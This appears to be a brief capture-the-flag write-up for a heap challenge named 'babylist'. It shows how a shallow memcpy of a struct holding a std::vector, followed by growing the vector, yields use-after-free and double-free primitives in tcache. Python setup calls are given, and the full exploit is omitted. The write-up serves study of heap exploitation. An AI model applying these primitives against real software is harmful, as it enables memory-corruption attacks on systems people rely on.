# babylist
In the duplicate_list function, there is a bug:
```
list[i] = new;
 memcpy(list[i], list[old], 0x88uLL);  
```

Each list object (structure) there is a vector field that becomes the attack surface

```
struct list_object {
	char name[0x70];
	struct vector (std::vector);
}
```

If a vector object is extended beyond its original size the original vector buffer is free'd and a longer one is allocated for it. So, if we do this it triggers a use-after-free bug.

```
    create("uaf1\n") #0
    add(0,1234)
    add(0,5678)
    dup(0,"uaf2\n") #1
    create("free\n") #2

    # free vec(free)
    for i in range(5):
        add(0x2,0x1)

    # free vec(uaf1)    
    for i in range(5):
        add(0x0,0x1)
```

Because uaf1's vector is extended from size 2 to size 7, its original vectors pointers are freed, but they are still used by uaf2's vectors. This gives us two primitives: UAF and double free. These primitives in `tcache` is so powerful so I'll skip the specific exploit process

